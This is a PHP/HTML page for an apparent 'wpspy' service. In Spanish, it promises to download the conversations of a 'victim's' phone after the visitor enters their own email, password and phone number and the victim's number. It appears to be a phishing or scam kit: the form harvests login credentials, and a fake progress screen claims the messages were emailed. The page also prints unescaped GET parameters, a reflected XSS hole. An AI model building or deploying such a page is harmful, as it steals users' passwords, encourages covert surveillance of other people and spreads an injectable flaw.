<html>
<head>
<meta name="viewport" content="width=device-width, minimum-scale=0.4, maximum-scale=2.0" />
<meta charset="UTF-8">
	<link rel="stylesheet" type="text/css" href="./css/estilo.css" media="screen" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script type="text/javascript" src="./js/loader.js"></script>
	<script type="text/javascript" src="./js/funciones.js"></script>
</head>
<body>
<div id="principal">
<?php
    $finalizado = isset($_GET['finalizado']) ? $_GET['finalizado'] : false ;
    $phone_victima = isset($_GET['phone_victima']) ? $_GET['phone_victima'] : null ;
    $email= isset($_GET['email']) ? $_GET['email'] : null ;

    if($finalizado == false){
?>
 <form id="contact_form" action="conseguir_premium.php" method="POST" enctype="multipart/form-data">
        <img src="./img/wpspy2.png">
		<br>
		<p>Elige el Sistema Operativo del teléfono de tu víctima <img class="arrow" src="./img/arrow.png"></p>
		<div class="row muestra">
            <img class="plataform" src="./img/phone-android.png" onclick="document.getElementById('android').click();">
			<img class="plataform" src="./img/phone-iphone.png" onclick="document.getElementById('iphone').click();">
			<img class="plataform" src="./img/phone-wp.png" onclick="document.getElementById('windows').click();">
			<div class="opt">
				<span><input type="radio" name="ptf" id="android" checked="checked"/>Android</span>
				<span><input type="radio" name="ptf" id="iphone"/>Iphone</span>
				<span><input type="radio" name="ptf" id="windows"/>Windows Phone</span>
			</div>
        </div>
		<br>
        <div class="row">
            <input id="email" class="input" name="email" type="text" value="" size="30" placeholder="Email" required="required"/><br />
        </div>
        <div class="row">
            <input id="password" class="input" name="password" type="password" value="" size="30" placeholder="Password" required="required"/><br />
        </div>
		<div class="row">
            <input id="phone" class="input" name="phone" type="tel" pattern="[0-9]{9}" size="30" placeholder="Tú número" required="required"/><br />
        </div>
		<div class="row">
            <input id="phone_victima" class="input" name="phone_victima" type="tel" pattern="[0-9]{9}" size="30" placeholder="Número de la víctima" required="required"/><br />
        </div>
        <input type="hidden" name="action" value="submit"/>
        <input id="submit_button1" type="submit" value="Descargar Conversaciones" />
    </form>
    <?php
        }
        else{
    ?>
        <form id="contact_form" action="index.php" method="POST" enctype="multipart/form-data">
            <img src="./img/wpspy2.png">
            <br>
            <center><!--<div class="loader"></div>--><br><span class="download">Descargando archivos...<span></center>
			
			<div id="myProgress">
				<div id="myBar">
					<div id="label">0%</div>
				</div>
			</div>
			
            <div class="mostrar">
            <p>¡Proceso completado!</p>
            <p>Hemos enviado un correo a tu dirección<br><b><?php echo $email ?></b></p>
            <p>En el encontrarás las conversaciones del número <b><?php echo $phone_victima ?></b>!</p>
            <br>
            <input id="submit_button" type="submit" value="Finalizar" />
            </div>
        </form>
    <?php
        }
    ?>
</div>
</body>
</html>